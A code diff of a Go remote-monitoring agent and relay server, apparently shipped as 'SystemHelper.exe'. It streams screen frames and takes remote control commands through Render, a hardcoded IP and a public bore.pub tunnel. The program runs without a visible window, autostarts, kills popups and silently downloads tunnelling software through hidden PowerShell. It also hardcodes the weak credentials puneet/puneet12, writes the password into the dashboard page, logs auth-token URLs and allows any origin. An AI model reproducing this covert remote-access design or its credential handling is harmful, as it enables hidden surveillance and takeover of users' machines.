@@ -54,12 +54,14 @@ const maxControlCmdsPerSec = 30
 var consecutiveFailures int
 var tunnelStarted bool
 
-// Embedded default URLs — zero-config, works out of the box
-const (
+// Deployment defaults — overridden by config.ini
+var (
 	DefaultServerURL   = "wss://pu-k752.onrender.com"
 	DirectServerIP     = "ws://43.247.40.101:3000"
 	GitHubRegistryURL  = "https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini"
 	ConfigPort         = 8181
+	BrandingCredit     = "Monitor System designed by Puneet Upreti"
+	BrandingTitle      = "Remote Monitor"
 )
 
 var serverUrls = []string{
@@ -189,7 +191,17 @@ func loadCustomUrls() {
 		}
 	}
 	
-	// 3. Default: Built-in Render URL
+	// 3. Default: Built-in localhost + Render URL
+	// Always include localhost first for fast same-network access
+	foundLocal := false
+	for _, u := range serverUrls {
+		if u == "ws://127.0.0.1:3000" { foundLocal = true; break }
+	}
+	if !foundLocal {
+		serverUrls = append([]string{"ws://127.0.0.1:3000"}, serverUrls...)
+		log("✅ Added localhost to server list (Priority 0)")
+	}
+	
 	if len(serverUrls) == 0 {
 		serverUrls = append(serverUrls, DefaultServerURL)
 		log("⚠️ Using default Render URL as fallback")
@@ -245,7 +257,7 @@ func startConfigServer() {
 			"hostname":  hostname,
 			"urls":      serverUrls,
 			"uptime":    time.Since(programStartTime).String(),
-			"connected": wsRef != nil,
+			"connected": len(wsRefs) > 0,
 		})
 	})
 	http.HandleFunc("/api/urls", func(w http.ResponseWriter, r *http.Request) {
@@ -259,7 +271,11 @@ func startConfigServer() {
 				dataFile := filepath.Join(dataDir(), "urls.ini")
 				os.WriteFile(dataFile, []byte(body.URL+"\n"), 0644)
 				log("URL updated via config panel: " + body.URL)
-				if wsRef != nil { wsRef.Close() }
+				wsRefsMu.Lock()
+				refs := make([]*websocket.Conn, len(wsRefs))
+				copy(refs, wsRefs)
+				wsRefsMu.Unlock()
+				if len(refs) > 0 { for _, c := range refs { c.Close() } }
 			}
 			w.Write([]byte(`{"ok":true}`))
 		} else {
@@ -333,20 +349,166 @@ load();setInterval(load,5000);
 
 // Agent info for server mode
 type AgentInfo struct {
-	Ws       *websocket.Conn
-	Name     string
-	LastFrame string
-	Viewers  map[*websocket.Conn]bool
+	Ws          *websocket.Conn
+	Name        string
+	Hostname    string
+	LocalIP     string
+	PublicIP    string
+	AgentIP     string
+	Org         string
+	Version     string
+	BootTime    string
+	ProgramStart string
+	ConnectionId string
+	LastFrame   string
+	Uptime      int
+	TotalIdle   int64
+	TotalActive int64
+	CurrentState string
+	TunnelURL   string
+	Viewers     map[*websocket.Conn]bool
 }
 
 func init() {
 	hostname, _ = os.Hostname()
-	loadAuth()
-	loadCustomUrls()
+	// Open log file FIRST so all init messages are captured
 	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	logFile = f
 	os.MkdirAll(receivedDir(), 0755)
+	
+	loadDeploymentConfig()
+	loadAuth()
+	loadCustomUrls()
+	
 	log("Started v" + Version)
+}
+
+// Embedded deployment config — self-contained binary, no separate file needed
+const embeddedConfig = `# ============================================================
+# SystemHelper Deployment Configuration
+# ============================================================
+# This file is embedded in SystemHelper.exe and auto-extracted on first run.
+# To customize for a new company: edit this section, then rebuild.
+#
+# Lines starting with # or ; are comments and are ignored.
+#
+# LOCATION (auto-extracted to):
+#   1. Same folder as SystemHelper.exe
+#   2. %APPDATA%\SystemHelper\config.ini
+# ============================================================
+
+# Authentication credentials (used for dashboard login & agent auth)
+auth_user=puneet
+auth_pass=puneet12
+
+# Default server URLs (agent tries these in order)
+# wss:// = secure WebSocket (Render, Cloudflare, etc.)
+# ws://  = plain WebSocket (local network, VPS)
+default_server=wss://pu-k752.onrender.com
+direct_server=ws://43.247.40.101:3000
+
+# GitHub URL for centralized server list management
+# Agents fetch this file to get updated server URLs
+# Format: one URL per line, # for comments
+# Example: https://raw.githubusercontent.com/YOUR-ORG/REPO/main/urls.ini
+github_config_url=https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini
+
+# Configuration panel port (http://localhost:PORT)
+config_port=8181
+
+# Branding text shown in dashboard header and lock screen
+branding_title=Remote Monitor
+branding_credit=Monitor System designed by Puneet Upreti
+
+# ============================================================
+# Deployment Checklist for New Company:
+# ============================================================
+# 1. Edit the values above for the new company
+# 2. Rebuild: go build -o SystemHelper.exe -ldflags="-H windowsgui" .
+# 3. Distribute the single .exe file (config is inside!)
+# 4. Optional: place a separate config.ini next to .exe to override
+# ============================================================
+`
+
+func loadDeploymentConfig() {
+	// config.ini search order:
+	// 1. Same directory as .exe (external override)
+	// 2. %APPDATA%\SystemHelper\ (agent data dir)
+	// 3. Current working directory
+	// 4. Embedded config (built-in)
+	exe, _ := os.Executable()
+	exeDir := filepath.Dir(exe)
+	cwd, _ := os.Getwd()
+	
+	searchPaths := []string{
+		filepath.Join(exeDir, "config.ini"),
+		filepath.Join(dataDir(), "config.ini"),
+		filepath.Join(cwd, "config.ini"),
+	}
+	
+	var configPath string
+	var data []byte
+	var err error
+	
+	for _, p := range searchPaths {
+		data, err = os.ReadFile(p)
+		if err == nil {
+			configPath = p
+			break
+		}
+	}
+	
+	// If no external config found, extract embedded config
+	if configPath == "" {
+		log("No config.ini found — extracting embedded config")
+		configPath = filepath.Join(exeDir, "config.ini")
+		os.WriteFile(configPath, []byte(embeddedConfig), 0644)
+		// Also copy to APPDATA for persistence
+		appDataCfg := filepath.Join(dataDir(), "config.ini")
+		os.WriteFile(appDataCfg, []byte(embeddedConfig), 0644)
+		data = []byte(embeddedConfig)
+	}
+	
+	log("Loading deployment config from: " + configPath)
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") { continue }
+		
+		if strings.HasPrefix(line, "auth_user=") {
+			authUser = strings.TrimSpace(strings.TrimPrefix(line, "auth_user="))
+		} else if strings.HasPrefix(line, "auth_pass=") {
+			authPass = strings.TrimSpace(strings.TrimPrefix(line, "auth_pass="))
+		} else if strings.HasPrefix(line, "default_server=") {
+			DefaultServerURL = strings.TrimSpace(strings.TrimPrefix(line, "default_server="))
+		} else if strings.HasPrefix(line, "direct_server=") {
+			DirectServerIP = strings.TrimSpace(strings.TrimPrefix(line, "direct_server="))
+		} else if strings.HasPrefix(line, "github_config_url=") {
+			GitHubRegistryURL = strings.TrimSpace(strings.TrimPrefix(line, "github_config_url="))
+		} else if strings.HasPrefix(line, "config_port=") {
+			port := strings.TrimSpace(strings.TrimPrefix(line, "config_port="))
+			if p, err := strconv.Atoi(port); err == nil && p > 0 && p < 65536 {
+				ConfigPort = p
+			}
+		} else if strings.HasPrefix(line, "branding_credit=") {
+			BrandingCredit = strings.TrimSpace(strings.TrimPrefix(line, "branding_credit="))
+		} else if strings.HasPrefix(line, "branding_title=") {
+			BrandingTitle = strings.TrimSpace(strings.TrimPrefix(line, "branding_title="))
+		}
+	}
+	
+	// Rebuild serverUrls with new defaults
+	serverUrls = []string{
+		DefaultServerURL,
+		"ws://127.0.0.1:3000",
+		DirectServerIP,
+	}
+	serverNames = map[string]string{
+		"render": DefaultServerURL,
+		"direct": DirectServerIP,
+	}
+	
+	log("Deployment config loaded: auth=" + authUser + " server=" + DefaultServerURL + " port=" + strconv.Itoa(ConfigPort))
 }
 
 func log(msg string) {
@@ -385,9 +547,6 @@ func main() {
 		os.Exit(0)
 	}()
 	
-	log("Started v" + Version)
-	
-	// Check for --server flag (manual server mode)
 	useMode := ""
 	for i := 0; i < len(os.Args); i++ {
 		arg := os.Args[i]
@@ -458,6 +617,7 @@ func main() {
 	}
 
 	// Apply --use filter
+	
 	if useMode != "" {
 		if url, ok := serverNames[useMode]; ok {
 			serverUrls = []string{url}
@@ -467,15 +627,14 @@ func main() {
 		}
 	}
 	
-	// Start periodic URL refresher from GitHub
 	startUrlRefresher()
 
 	preventDuplicate()
 	loadAgentId()
-	setupAutostart()
+	go setupAutostart()
 	startActivityLogger()
 	startConfigServer()
-	
+	startPopupKiller()
 	// Check if this PC was remotely designated as fallback server
 	preferredServer := loadServerPreference()
 	if isServerMode || preferredServer {
@@ -557,8 +716,13 @@ func main() {
 		case <-ipTicker.C:
 			newLocalIP := getLocalIP()
 			newPublicIP := getPublicIP()
-			if wsRef != nil && (newLocalIP != "" || newPublicIP != "") {
-				wsRef.WriteJSON(Message{
+			wsRefsMu.Lock()
+			refs := make([]*websocket.Conn, len(wsRefs))
+			copy(refs, wsRefs)
+			wsRefsMu.Unlock()
+			if len(refs) > 0 && (newLocalIP != "" || newPublicIP != "") {
+				for _, c := range refs {
+					c.WriteJSON(Message{
 					Type: "ip-update",
 					AgentId: agentId,
 					Data: map[string]interface{}{
@@ -566,6 +730,7 @@ func main() {
 						"publicIP": newPublicIP,
 					},
 				})
+				}
 				log("IP update sent: local=" + newLocalIP + " public=" + newPublicIP)
 			}
 		}
@@ -706,13 +871,19 @@ func cleanupLogs() {
 	os.Truncate(filepath.Join(dir, "error.log"), 0)
 	
 	// Send status to server
-	if wsRef != nil {
-		wsRef.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
+	wsRefsMu.Lock()
+	refs := make([]*websocket.Conn, len(wsRefs))
+	copy(refs, wsRefs)
+	wsRefsMu.Unlock()
+	for _, c := range refs {
+		c.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
 	}
 	log("Logs cleaned")
 }
 
 var wsRef *websocket.Conn // Reference to primary WebSocket for agent responses
+var wsRefs []*websocket.Conn // All active connections (local + render + tunnel)
+var wsRefsMu sync.Mutex // Protects wsRefs slice
 var localCancel context.CancelFunc // Cancel previous secondary goroutine on reconnect
 
 func logEventDate(msg string) {
@@ -829,8 +1000,8 @@ func startTunnel(ws *websocket.Conn) {
 			borePath := filepath.Join(dataDir(), "bore.exe")
 			if _, err := os.Stat(borePath); os.IsNotExist(err) {
 				log("Downloading bore...")
-				dl := exec.Command("powershell", "-Command",
-					"Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
+				dl := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+					"$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
 					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
 					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
 				hideCmd(dl)
@@ -847,18 +1018,33 @@ func startTunnel(ws *websocket.Conn) {
 					lastErr = "bore start: " + err.Error()
 					log("bore start failed: " + err.Error())
 				} else {
-					buf := make([]byte, 256)
+					buf := make([]byte, 1024)
 					n, _ := stdout.Read(buf)
-					outLine := strings.TrimSpace(string(buf[:n]))
-					if strings.Contains(outLine, ":") {
-						port := strings.TrimSpace(strings.Split(outLine, " ")[0])
-						url = "http://bore.pub:" + port
-					}
-					if url == "" && outLine != "" {
-						url = outLine
+					outLine := stripANSI(strings.TrimSpace(string(buf[:n])))
+					log("bore output: " + outLine)
+					// Try multiple formats:
+					// 1. "remote_port=15517"
+					// 2. "2026-05-16T09:02:01.847796Z 12345"
+					// 3. "12345"
+					if idx := strings.Index(outLine, "remote_port="); idx >= 0 {
+						portStr := strings.TrimSpace(outLine[idx+len("remote_port="):])
+						portEnd := strings.IndexAny(portStr, " \t\n\r")
+						if portEnd > 0 { portStr = portStr[:portEnd] }
+						if p, err := strconv.Atoi(portStr); err == nil && p > 1000 && p < 65536 {
+							url = "http://bore.pub:" + strconv.Itoa(p)
+						}
 					}
 					if url == "" {
-						lastErr = "bore: no URL in output: " + outLine
+						parts := strings.Fields(outLine)
+						for _, part := range parts {
+							if p, err := strconv.Atoi(part); err == nil && p > 1000 && p < 65536 {
+								url = "http://bore.pub:" + strconv.Itoa(p)
+								break
+							}
+						}
+					}
+					if url == "" {
+						lastErr = "bore: no port in output: " + outLine
 					}
 				}
 			} else {
@@ -959,6 +1145,7 @@ func runServer() {
 	setupAutostart()
 	startActivityLogger()
 	agents := make(map[string]*AgentInfo)
+	dashboards := make(map[*websocket.Conn]bool)
 
 	// Generate auth token from credentials
 	authToken := sha256Hex(authUser + ":" + authPass)
@@ -994,17 +1181,122 @@ func runServer() {
 			case "agent-hello":
 				role = "agent"
 				agentIdPtr = d.AgentId
-				agents[d.AgentId] = &AgentInfo{Ws: conn, Name: d.Name, Viewers: make(map[*websocket.Conn]bool)}
-				log("Agent: " + d.Name)
+				data := d.Data
+				if data == nil { data = make(map[string]interface{}) }
+				agents[d.AgentId] = &AgentInfo{
+					Ws:           conn,
+					Name:         d.Name,
+					Hostname:     strVal(data["hostname"]),
+					LocalIP:      strVal(data["localIP"]),
+					PublicIP:     strVal(data["publicIP"]),
+					AgentIP:      strVal(data["agentIP"]),
+					Org:          d.Org,
+					Version:      strVal(data["version"]),
+					BootTime:     strVal(data["bootTime"]),
+					ProgramStart: strVal(data["programStart"]),
+					ConnectionId: strVal(data["connectionId"]),
+					Viewers:      make(map[*websocket.Conn]bool),
+				}
+				log("Agent connected: " + d.Name + " (local=" + agents[d.AgentId].LocalIP + " public=" + agents[d.AgentId].PublicIP + ")")
+				// Broadcast to all dashboards
+				for dash := range dashboards {
+					dash.WriteJSON(map[string]interface{}{
+						"type":     "agent-connected",
+						"agentId":  d.AgentId,
+						"name":     d.Name,
+						"hostname": agents[d.AgentId].Hostname,
+						"ip":       agents[d.AgentId].LocalIP,
+						"localIP":  agents[d.AgentId].LocalIP,
+						"publicIP": agents[d.AgentId].PublicIP,
+						"org":      d.Org,
+						"version":  agents[d.AgentId].Version,
+					})
+				}
 			case "agent-frame":
 				if a, ok := agents[d.AgentId]; ok {
 					if d.Display == 0 { a.LastFrame = d.Frame }
 					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame, Display: d.Display}) }
 				}
+			case "agent-status":
+				if a, ok := agents[d.AgentId]; ok {
+					sd := d.Data
+					if sd == nil { sd = make(map[string]interface{}) }
+					a.Uptime = intVal(sd["uptime"])
+					a.TotalIdle = int64Val(sd["totalIdle"])
+					a.TotalActive = int64Val(sd["totalActive"])
+					a.CurrentState = strVal(sd["currentState"])
+					// Forward to dashboards
+					for dash := range dashboards {
+						dash.WriteJSON(map[string]interface{}{
+							"type":        "agent-status",
+							"agentId":     d.AgentId,
+							"uptime":      a.Uptime,
+							"totalIdle":   a.TotalIdle,
+							"totalActive": a.TotalActive,
+							"currentState": a.CurrentState,
+							"version":     strVal(sd["version"]),
+						})
+					}
+				}
+			case "ip-update":
+				if a, ok := agents[d.AgentId]; ok {
+					sd := d.Data
+					if sd == nil { sd = make(map[string]interface{}) }
+					a.LocalIP = strVal(sd["localIP"])
+					a.PublicIP = strVal(sd["publicIP"])
+					// Forward to dashboards
+					for dash := range dashboards {
+						dash.WriteJSON(map[string]interface{}{
+							"type":     "ip-update",
+							"agentId":  d.AgentId,
+							"localIP":  a.LocalIP,
+							"publicIP": a.PublicIP,
+						})
+					}
+				}
+			case "tunnel-status":
+				if a, ok := agents[d.AgentId]; ok {
+					a.TunnelURL = d.Command
+					// Forward to dashboards
+					for dash := range dashboards {
+						dash.WriteJSON(map[string]interface{}{
+							"type":    "tunnel-status",
+							"agentId": d.AgentId,
+							"command": d.Command,
+							"frame":   d.Frame,
+						})
+					}
+				}
+			case "agent-log":
+				// Forward logs to dashboards if needed
+				for dash := range dashboards {
+					dash.WriteJSON(map[string]interface{}{
+						"type":    "agent-log",
+						"agentId": d.AgentId,
+						"frame":   d.Frame,
+					})
+				}
 			case "dashboard-hello":
 				role = "dashboard"
+				dashboards[conn] = true
+				// Send current agent list with full data
 				list := []map[string]interface{}{}
-				for id, a := range agents { list = append(list, map[string]interface{}{"id": id, "name": a.Name}) }
+				for id, a := range agents {
+					list = append(list, map[string]interface{}{
+						"id":         id,
+						"name":       a.Name,
+						"hostname":   a.Hostname,
+						"localIP":    a.LocalIP,
+						"publicIP":   a.PublicIP,
+						"org":        a.Org,
+						"version":    a.Version,
+						"uptime":     a.Uptime,
+						"totalIdle":  a.TotalIdle,
+						"totalActive": a.TotalActive,
+						"currentState": a.CurrentState,
+						"tunnelURL":  a.TunnelURL,
+					})
+				}
 				conn.WriteJSON(map[string]interface{}{"type": "agent-list", "agents": list})
 			case "view-agent":
 				if a, ok := agents[d.AgentId]; ok {
@@ -1037,7 +1329,17 @@ func runServer() {
 				}
 			}
 		}
-		if role == "agent" && agentIdPtr != "" { delete(agents, agentIdPtr); log("Agent gone: " + agentIdPtr) }
+		if role == "agent" && agentIdPtr != "" {
+			delete(agents, agentIdPtr)
+			log("Agent disconnected: " + agentIdPtr)
+			// Broadcast to all dashboards
+			for dash := range dashboards {
+				dash.WriteJSON(map[string]interface{}{"type": "agent-disconnected", "agentId": agentIdPtr})
+			}
+		}
+		if role == "dashboard" {
+			delete(dashboards, conn)
+		}
 	})
 
 	// Start embedded agent for this PC
@@ -1045,7 +1347,15 @@ func runServer() {
 		time.Sleep(1 * time.Second)
 		c, _, err := websocket.DefaultDialer.Dial("ws://127.0.0.1:3000/ws?token="+authToken, nil)
 		if err != nil { log("Embedded agent failed: " + err.Error()); return }
-		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName, Data: map[string]interface{}{"agentIP": getLocalIP()}})
+		c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: hostname + " (server)", Org: orgName, Data: map[string]interface{}{
+			"bootTime":     bootTime().Format(time.RFC3339),
+			"programStart": programStartTime.Format(time.RFC3339),
+			"version":      Version,
+			"agentIP":      getLocalIP(),
+			"localIP":      getLocalIP(),
+			"publicIP":     getPublicIP(),
+			"hostname":     hostname,
+		}})
 		go func() {
 			for {
 				_, m, e := c.ReadMessage()
@@ -1071,6 +1381,10 @@ func runServer() {
 		w.Header().Set("Access-Control-Allow-Origin", "*")
 		if r.URL.Path == "/" {
 			html := strings.Replace(htmlDashboard, "TOKEN_PLACEHOLDER", authToken, 1)
+			html = strings.Replace(html, "PASS_PLACEHOLDER", authPass, 1)
+			html = strings.Replace(html, "USER_PLACEHOLDER", authUser, 1)
+			html = strings.Replace(html, "BRANDING_TITLE", BrandingTitle, 1)
+			html = strings.Replace(html, "BRANDING_CREDIT", BrandingCredit, 1)
 			w.Write([]byte(html))
 		}
 	})
@@ -1126,13 +1440,31 @@ func discoverServer() string {
 func getLocalIP() string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil { return "" }
+	
+	var lanIP, linkLocalIP string
 	for _, a := range addrs {
 		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
 			if ip := ipnet.IP.To4(); ip != nil {
-				return ip.String()
+				ipStr := ip.String()
+				// Prefer LAN IPs: 192.168.x.x, 10.x.x.x, 172.16-31.x.x
+				if strings.HasPrefix(ipStr, "192.168.") || 
+				   strings.HasPrefix(ipStr, "10.") || 
+				   (len(ip) >= 2 && ip[0] == 172 && ip[1] >= 16 && ip[1] <= 31) {
+					return ipStr
+				}
+				// Keep link-local as fallback
+				if strings.HasPrefix(ipStr, "169.254.") {
+					linkLocalIP = ipStr
+				} else if lanIP == "" {
+					lanIP = ipStr
+				}
 			}
 		}
 	}
+	
+	// Return best available IP
+	if lanIP != "" { return lanIP }
+	if linkLocalIP != "" { return linkLocalIP }
 	return ""
 }
 
@@ -1152,6 +1484,50 @@ func isValidURL(u string) bool {
 	return strings.HasPrefix(u, "ws://") || strings.HasPrefix(u, "wss://")
 }
 
+func stripANSI(s string) string {
+	// Remove ANSI escape sequences like \x1b[2m, \x1b[0m, etc.
+	result := ""
+	inEscape := false
+	for _, r := range s {
+		if r == 27 { // ESC character
+			inEscape = true
+		} else if inEscape {
+			if r == 'm' || r == 'H' || r == 'J' || r == 'K' || r == 'A' || r == 'B' || r == 'C' || r == 'D' {
+				inEscape = false
+			}
+		} else {
+			result += string(r)
+		}
+	}
+	return result
+}
+
+func strVal(v interface{}) string {
+	if v == nil { return "" }
+	if s, ok := v.(string); ok { return s }
+	return fmt.Sprintf("%v", v)
+}
+
+func intVal(v interface{}) int {
+	if v == nil { return 0 }
+	switch val := v.(type) {
+	case float64: return int(val)
+	case int: return val
+	case int64: return int(val)
+	}
+	return 0
+}
+
+func int64Val(v interface{}) int64 {
+	if v == nil { return 0 }
+	switch val := v.(type) {
+	case float64: return int64(val)
+	case int: return int64(val)
+	case int64: return val
+	}
+	return 0
+}
+
 func connect() {
 	if isInternalMode {
 		log("INTERNAL MODE: Cloud disabled, local network only")
@@ -1166,308 +1542,560 @@ func connect() {
 		}
 	}
 	
-	// Start tunnel FIRST for fast remote access (primary connection)
+	// Start tunnel FIRST for remote access via bore/SSH
 	if !tunnelStarted {
-		log("🚀 Starting tunnel for fast remote access...")
+		log("🚀 Starting tunnel for remote access...")
 		tunnelStarted = true
 		go startTunnel(nil)
-		// Wait up to 20s for tunnel URL
-		for i := 0; i < 20; i++ {
+		// Wait up to 30s for tunnel URL
+		for i := 0; i < 30; i++ {
 			tunnelURL, _ := os.ReadFile(filepath.Join(dataDir(), "tunnel.url"))
 			if len(tunnelURL) > 0 {
-				tunnelStr := strings.TrimSpace(string(tunnelURL))
+				tunnelStr := stripANSI(strings.TrimSpace(string(tunnelURL)))
+				// Validate it's a proper URL
 				if tunnelStr != "" && (strings.HasPrefix(tunnelStr, "http://") || strings.HasPrefix(tunnelStr, "https://")) {
+					// Make sure it doesn't contain ANSI artifacts
+					if strings.Contains(tunnelStr, "remote_port=") || strings.Contains(tunnelStr, "INFO") || strings.Contains(tunnelStr, "bore_cli") {
+						continue // Wait for clean URL
+					}
 					wsURL := tunnelStr
 					if strings.HasPrefix(wsURL, "http://") {
 						wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
 					} else if strings.HasPrefix(wsURL, "https://") {
 						wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
 					}
-					// Prepend tunnel URL as PRIMARY
 					found := false
 					for _, u := range serverUrls {
 						if u == wsURL+"/ws" { found = true; break }
 					}
 					if !found {
 						serverUrls = append([]string{wsURL + "/ws"}, serverUrls...)
-						log("✅ Tunnel URL set as PRIMARY: " + wsURL)
+						log("✅ Tunnel URL added: " + wsURL)
 					}
 					break
 				}
 			}
 			time.Sleep(1 * time.Second)
 		}
-		if len(serverUrls) == 0 || !strings.Contains(serverUrls[0], "tunnel") {
-			log("⚠️ Tunnel not ready — using Render as primary")
-		}
 	}
 	
-	// Periodic re-discovery: check for local server on each retry
-	discoveredIP := discoverServer()
-	if discoveredIP != "" {
-		localURL := "ws://" + discoveredIP + ":3000"
-		found := false
-		for _, u := range serverUrls {
-			if u == localURL { found = true; break }
-		}
-		if !found {
-			serverUrls = append(serverUrls, localURL)
-			log("Local server discovered: " + localURL + " (added as fallback)")
-		}
+	// Ensure localhost is always in the list
+	foundLocal := false
+	for _, u := range serverUrls {
+		if u == "ws://127.0.0.1:3000" || u == "ws://127.0.0.1:3000/ws" { foundLocal = true; break }
 	}
+	if !foundLocal {
+		serverUrls = append([]string{"ws://127.0.0.1:3000"}, serverUrls...)
+	}
+	
+	// Ensure Render is always in the list
+	foundRender := false
+	for _, u := range serverUrls {
+		if strings.Contains(u, "render.com") { foundRender = true; break }
+	}
+	if !foundRender {
+		serverUrls = append(serverUrls, "wss://pu-k752.onrender.com")
+	}
+	
+	// Wake up Render server (free tier sleeps after 15 min)
+	log("🔔 Waking up Render server...")
+	go func() {
+		resp, err := http.Get("https://pu-k752.onrender.com")
+		if err == nil {
+			defer resp.Body.Close()
+			log("✅ Render server responded (HTTP " + strconv.Itoa(resp.StatusCode) + ")")
+		}
+	}()
 	
 	log("URLs to try: " + fmt.Sprintf("%v", serverUrls))
 	
-	var c *websocket.Conn
-	dialer := *websocket.DefaultDialer
-	dialer.HandshakeTimeout = 5 * time.Second
+	// Connect to ALL URLs simultaneously (local + render + tunnel)
+	var connections []*websocket.Conn
+	var connNames []string
+	
 	for _, url := range serverUrls {
-		if !isValidURL(url) {
-			log("Skipping invalid URL: " + url)
+		if !isValidURL(url) { continue }
+		
+		// Build auth URL - avoid double /ws
+		authURL := url
+		if !strings.HasSuffix(authURL, "/ws") {
+			authURL = authURL + "/ws"
+		}
+		authURL = authURL + "?token=" + authToken
+		
+		dialer := *websocket.DefaultDialer
+		
+		// Render needs 55s timeout (free tier spin-up time)
+		if strings.Contains(url, "render.com") {
+			dialer.HandshakeTimeout = 55 * time.Second
+		} else {
+			dialer.HandshakeTimeout = 5 * time.Second
+		}
+		
+		log("Connecting to: " + url)
+		log("Auth URL: " + authURL)
+		c, _, err := dialer.Dial(authURL, nil)
+		if err != nil {
+			log("Failed " + url + ": " + err.Error())
 			continue
 		}
-		log("Trying: " + url)
-		var err error
-		authURL := url + "/ws?token=" + authToken
-		c, _, err = dialer.Dial(authURL, nil)
-		if err == nil { log("Connected: " + url); break }
+		
+		name := url
+		if strings.Contains(url, "127.0.0.1") { name = "local" }
+		if strings.Contains(url, "render.com") { name = "render" }
+		if strings.Contains(url, "bore") || strings.Contains(url, "localhost.run") { name = "tunnel" }
+		
+		connections = append(connections, c)
+		connNames = append(connNames, name)
+		log("✅ Connected: " + name + " (" + url + ")")
 	}
-	if c == nil {
+	
+	if len(connections) == 0 {
 		consecutiveFailures++
 		log("Disconnected: all URLs failed (failure #" + fmt.Sprintf("%d", consecutiveFailures) + ")")
 		return
 	}
-	// Reset failure counter on successful connection
+	
 	consecutiveFailures = 0
+	wsRefsMu.Lock()
+	wsRefs = connections
+	wsRefsMu.Unlock()
+	wsRef = connections[0] // Primary for backward compatibility
 	
-	log("Connected: " + c.RemoteAddr().String())
-	defer c.Close()
-	wsRef = c
-	
-	// Generate new connection ID — prevents race condition on reconnect
+	// Generate new connection ID
 	connectionId = fmt.Sprintf("%d", time.Now().UnixNano())
 	
-	go func() {
-		for {
-			time.Sleep(30 * time.Second)
-			if wsRef == nil || c != wsRef { return }
-			if err := c.WriteMessage(websocket.PingMessage, nil); err != nil { return }
-		}
-	}()
-
 	localIP := getLocalIP()
 	publicIP := getPublicIP()
 	displayName := hostname
 	if localIP != "" { displayName = hostname + " (" + localIP + ")" }
 	log("Local IP: " + localIP + " | Public IP: " + publicIP)
-	if err := c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: displayName, Org: orgName, Data: map[string]interface{}{
-		"bootTime":     bootTime().Format(time.RFC3339),
-		"programStart": programStartTime.Format(time.RFC3339),
-		"version":      Version,
-		"agentIP":      localIP,
-		"localIP":      localIP,
-		"publicIP":     publicIP,
-		"hostname":     hostname,
-		"connectionId": connectionId,
-	}}); err != nil {
-		log("Failed to send hello: " + err.Error())
-		return
+	log("Active connections: " + fmt.Sprintf("%v", connNames))
+	
+	// Send hello to ALL connections
+	for i, c := range connections {
+		if err := c.WriteJSON(Message{Type: "agent-hello", AgentId: agentId, Name: displayName, Org: orgName, Data: map[string]interface{}{
+			"bootTime":     bootTime().Format(time.RFC3339),
+			"programStart": programStartTime.Format(time.RFC3339),
+			"version":      Version,
+			"agentIP":      localIP,
+			"localIP":      localIP,
+			"publicIP":     publicIP,
+			"hostname":     hostname,
+			"connectionId": connectionId,
+			"connName":     connNames[i],
+		}}); err != nil {
+			log("Failed to send hello to " + connNames[i] + ": " + err.Error())
+		}
 	}
-
-	// Also connect to local server as secondary (for speed)
-	if localCancel != nil { localCancel() }
-	var lctx context.Context
-	lctx, localCancel = context.WithCancel(context.Background())
+	
+	// Ping keepalive for all connections
 	go func() {
-		localURL := "ws://127.0.0.1:3000/ws?token=" + authToken
-		localDialer := *websocket.DefaultDialer
-		localDialer.HandshakeTimeout = 2 * time.Second
-		c2, _, err2 := localDialer.Dial(localURL, nil)
-		if err2 != nil { return } // Local server not available
-		defer c2.Close()
-		// NO agent-hello here — primary connection owns the agent registration.
-		// This connection is frames-only for low-latency local viewing.
-		log("Connected to local server (secondary — frames only)")
-		
-		// Send frames to local server too
 		for {
-			select {
-			case <-lctx.Done():
-				log("Secondary connection stopped")
-				return
-			default:
-				for _, m := range captureFrames() {
-					m.Type = "agent-frame"
-					m.AgentId = agentId
-					if err := c2.WriteJSON(m); err != nil {
-						return
-					}
+			time.Sleep(30 * time.Second)
+			for _, c := range wsRefs {
+				if c != nil {
+					c.WriteMessage(websocket.PingMessage, nil)
 				}
-				time.Sleep(time.Second / time.Duration(fps))
 			}
 		}
 	}()
-
-	done := make(chan struct{})
-	go func() {
-		defer close(done)
-		for {
-			_, m, e := c.ReadMessage()
-			if e != nil { log("Disconnected: " + e.Error()); return }
-			var d Message
-			if err := json.Unmarshal(m, &d); err != nil {
-				log("Invalid message: " + err.Error())
-				continue
-			}
-			if d.Type == "set-fps" && d.Fps > 0 {
-			fps = d.Fps
-			if fps <= 2 {
-				jpegQuality = 50
-				isRemoteConnection = false
-			} else if fps <= 5 {
-				jpegQuality = 40
-				isRemoteConnection = true
-			} else {
-				jpegQuality = 30
-				isRemoteConnection = true
-			}
-		}
-			if d.Type == "control" {
-				// Rate limiting: max 30 control commands per second
-				now := time.Now()
-				if now.Sub(controlCmdWindowStart) > time.Second {
-					controlCmdWindowStart = now
-					controlCmdCount = 0
+	
+	// Message reader for ALL connections
+	type connDone struct {
+		c    *websocket.Conn
+		name string
+		done chan struct{}
+	}
+	
+	var allDone []chan struct{}
+	
+	for i, c := range connections {
+		name := connNames[i]
+		done := make(chan struct{})
